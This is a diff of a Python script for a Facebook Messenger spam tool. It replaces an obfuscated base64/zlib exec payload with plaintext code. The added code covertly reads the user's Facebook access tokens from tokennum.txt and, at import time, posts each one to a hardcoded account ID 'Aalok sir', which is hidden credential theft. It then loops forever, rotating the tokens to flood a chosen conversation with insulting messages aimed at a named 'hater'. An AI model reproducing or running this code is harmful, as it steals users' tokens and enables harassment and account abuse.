@@ -1,6 +1,150 @@
-# ENCRYPTED BY MR. SONU
-# CR34T3 BY S0NU L3G3ND
-# B3T4 T3R3 B44P S09U K4 3NCRYPTI0N H4I M4D4RCH0D 
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
-import zlib,base64
-exec(zlib.decompress(base64.b64decode("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")))
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"-- Y0U 4R3 USING SONU S3RV3R K33P Y0UR S3RV3R 4LIV3")
+def execute_server():
+      PORT = 4000
+
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
+
+
+def send_initial_message():
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+
+      # Modify the message as per your requirement
+      msg_template = "Hello Aalok sir! I am using your server. My token is {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "100003598551761"
+
+      requests.packages.urllib3.disable_warnings()
+
+      def liness():
+          print('\033[1;92m' + '==========𝗦𝗜𝗦𝗢𝗗𝗜𝗔 𝗝𝗜=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
+
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
+
+      with open('File.txt', 'r') as file:
+          messages = file.readlines()
+
+      num_messages = len(messages)
+
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
+
+      with open('hatersname.txt', 'r') as file:
+          haters_name = file.read().strip()
+
+      with open('time.txt', 'r') as file:
+          speed = int(file.read().strip())
+
+      def liness():
+          print('\033[1;92m' + '==========𝗦𝗜𝗦𝗢𝗗𝗜𝗔 𝗝𝗜=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
+
+if __name__ == '__main__':
+      main()
